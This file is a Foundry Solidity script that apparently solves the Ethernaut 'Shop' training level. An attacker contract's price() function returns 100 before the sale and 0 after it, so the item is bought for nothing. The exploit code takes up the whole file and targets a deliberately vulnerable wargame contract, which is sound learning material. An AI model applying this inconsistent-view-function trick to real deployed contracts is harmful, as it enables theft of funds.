// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";
import {Shop, Buyer} from "../src/EthernautShop.sol";

contract ShopSolution is Script {
    ShopAttack attacker;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        attacker = new ShopAttack();
        attacker.attack();
        vm.stopBroadcast();
    }
}

contract ShopAttack is Buyer {
    Shop shop = Shop(0xBf9541ed94fae2263AD2B1a892115d392face0dE);

    function price() external view override returns (uint256) {
        // Return 100 on first call, 0 on second call
        if (shop.isSold()) {
            return 0;
        }
        return 100;
    }

    function attack() external {
        shop.buy();
        console.log("Is sold? ", shop.isSold());
        console.log("Current price ", shop.price());
    }
}
